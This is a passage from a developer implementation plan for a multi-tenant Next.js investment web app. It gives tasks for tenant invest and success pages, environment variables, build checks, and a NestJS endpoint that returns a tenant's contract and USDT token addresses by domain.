        </h1>

        <p className="text-gray-600 mb-8">
          您的投資帳戶已成功註冊，現在可以開始投資了。
        </p>

        <div className="bg-gray-50 rounded-lg p-4">
          <p className="text-sm text-gray-600">
            請返回您的投資平台繼續操作
          </p>
        </div>
      </div>
    </div>
  );
}
```

**Step 2: Verify component**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 23: Tenant Invest Page

**Files:**
- Create: `apps/customer-web/app/(tenant)/page.tsx`

**Step 1: Create dynamic tenant page loader**

```typescript
// apps/customer-web/app/(tenant)/page.tsx
import { headers } from 'next/headers';
import { notFound } from 'next/navigation';
import { getTenantPages } from '@/tenants';
import { TenantConfig } from '@/shared/types';

export default async function TenantInvestPage() {
  const headersList = headers();
  const slug = headersList.get('x-tenant-slug');
  const configStr = headersList.get('x-tenant-config');

  if (!slug || !configStr) {
    notFound();
  }

  const tenantConfig: TenantConfig = JSON.parse(configStr);
  const pages = await getTenantPages(slug);

  if (!pages) {
    notFound();
  }

  const { InvestPage } = pages;

  return <InvestPage tenantConfig={tenantConfig} />;
}
```

**Step 2: Verify page**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 24: Tenant Success Page

**Files:**
- Create: `apps/customer-web/app/(tenant)/success/page.tsx`

**Step 1: Create success page route**

```typescript
// apps/customer-web/app/(tenant)/success/page.tsx
import { headers } from 'next/headers';
import { notFound } from 'next/navigation';
import { getTenantPages } from '@/tenants';
import { TenantConfig } from '@/shared/types';

export default async function TenantSuccessPage() {
  const headersList = headers();
  const slug = headersList.get('x-tenant-slug');
  const configStr = headersList.get('x-tenant-config');

  if (!slug || !configStr) {
    notFound();
  }

  const tenantConfig: TenantConfig = JSON.parse(configStr);
  const pages = await getTenantPages(slug);

  if (!pages) {
    notFound();
  }

  const { SuccessPage } = pages;

  return <SuccessPage tenantConfig={tenantConfig} />;
}
```

**Step 2: Verify page**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No errors

---

## Task 25: Environment Variables

**Files:**
- Create: `apps/customer-web/.env.local.example`

**Step 1: Create environment example file**

```bash
# apps/customer-web/.env.local.example

# Platform API URL (used by middleware for tenant lookup)
PLATFORM_API_URL=http://localhost:3000

# Tenant API URL (used by client for contract execution)
TENANT_API_URL=http://localhost:3001

# Public variables (accessible in browser)
NEXT_PUBLIC_PLATFORM_API_URL=http://localhost:3000
NEXT_PUBLIC_TENANT_API_URL=http://localhost:3001
```

**Step 2: Create actual .env.local**

Run: `cp apps/customer-web/.env.local.example apps/customer-web/.env.local`

---

## Task 26: Final Build Test

**Step 1: Install dependencies**

Run: `cd apps/customer-web && pnpm install`
Expected: Dependencies installed successfully

**Step 2: Type check**

Run: `cd apps/customer-web && pnpm type-check`
Expected: No TypeScript errors

**Step 3: Build the project**

Run: `cd apps/customer-web && pnpm build`
Expected: Build completes successfully

**Step 4: Start dev server**

Run: `cd apps/customer-web && pnpm dev`
Expected: Server starts on http://localhost:3002

---

## Task 27: Backend API Implementation

**Note:** This task should be implemented in the platform-api project.

**Files:**
- Create: `apps/platform-api/src/modules/tenants/tenants.controller.ts` (add endpoint)
- Create: `apps/platform-api/src/modules/tenants/dto/tenant-domain.dto.ts`

**Step 1: Create DTO for domain lookup**

```typescript
// apps/platform-api/src/modules/tenants/dto/tenant-domain.dto.ts
import { IsString, IsNotEmpty } from 'class-validator';

export class TenantDomainParamDto {
  @IsString()
  @IsNotEmpty()
  domain: string;
}
```

**Step 2: Add controller endpoint**

Add to `apps/platform-api/src/modules/tenants/tenants.controller.ts`:

```typescript
@Get('by-domain/:domain')
@Public()
async getTenantByDomain(
  @Param() params: TenantDomainParamDto,
): Promise<TenantResponseDto> {
  const tenant = await this.tenantsService.findByDomain(params.domain);

  if (!tenant) {
    throw new NotFoundException(`Tenant with domain ${params.domain} not found`);
  }

  return {
    slug: tenant.slug,
    name: tenant.name,
    config: {
      investmentContractAddress: tenant.investmentContractAddress,
      usdtTokenAddress: tenant.usdtTokenAddress,
      branding: tenant.branding,
    },
  };
}
```

**Step 3: Add service method**

Add to `apps/platform-api/src/modules/tenants/tenants.service.ts`:

```typescript
async findByDomain(domain: string): Promise<Tenant | null> {
  return this.tenantRepository.findOne({
    where: { customDomain: domain },
  });
}
```

**Step 4: Test endpoint**

Run: `curl http://localhost:3000/tenants/by-domain/tenant-a.example.com`
Expected: Returns tenant info or 404

---

## Completion Checklist

- [ ] All TypeScript files compile without errors
- [ ] Dev server starts successfully
- [ ] Build completes successfully
- [ ] Redirect page works with referral code and wallet parameter
- [ ] Middleware correctly identifies tenants
- [ ] Tenant pages load dynamically
- [ ] Wallet integration hooks are functional
- [ ] Error handling displays properly
- [ ] Backend API endpoint for tenant lookup is implemented
- [ ] Environment variables are configured

---

## Testing Strategy

1. **Unit Testing** - Test individual hooks and utilities
2. **Integration Testing** - Test wallet connection and approval flow
3. **E2E Testing** - Test complete user journey from redirect to success
4. **Manual Testing** - Test with actual wallet apps

---

## Future Enhancements

1. Add more wallet types (MetaMask, Trust Wallet, etc.)
2. Add loading states and animations
3. Add analytics tracking
4. Add error logging service
5. Add multi-language support
6. Add tenant-specific themes
7. Add investment amount selection
8. Add transaction history

---

## Notes

- This plan follows TDD principles where applicable
- Each task is designed to be completed in 2-5 minutes
- Frequent type checking ensures early error detection
- The implementation is production-ready with proper error handling
- The architecture supports easy addition of new tenants
- Middleware caching improves performance
